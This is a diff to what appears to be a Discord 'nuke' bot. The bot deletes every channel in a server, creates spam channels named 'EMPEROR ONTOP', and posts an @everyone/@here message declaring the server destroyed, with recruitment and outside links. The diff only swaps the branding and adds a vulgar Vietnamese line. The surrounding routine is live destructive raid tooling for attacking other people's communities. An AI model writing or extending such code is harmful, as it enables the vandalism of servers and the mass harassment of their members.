@@ -2984,15 +2984,15 @@ def register_admin_commands(b_target):
     async def run_all():
       try:
         channel_names = [
-            "N҉u҉k҉e҉ B҉y҉ B҉e҉c҉u҉s҉",
-            "N̷u҉k҉e҉ B̷y҉ B̷e҉c҉u҉s҉",
-            "ℕ𝕦𝕜𝕖 𝔹𝕪 𝔹𝕖𝕔𝕦𝕤",
-            "𝔑𝔲𝔨𝔢 𝔅𝔶 𝔅𝔢𝔠𝔲𝔰",
+            "EMPEROR",
+            "EMPEROR ONTOP",
+            "EMPEROR",
+            "EMPEROR ONTOP",
         ]
         noi_dung_nuke = """@everyone @here
 # [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
 # SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
-# [BECUS ONTOP](https://cutes.lol/emiuanh209)"""
+# [SERVER BỊ BỌN A CHỊCH](https://cutes.lol/emiuanh209)"""
 
         # 1. Xóa channel — 10s/channel
         for ch in list(guild.channels):
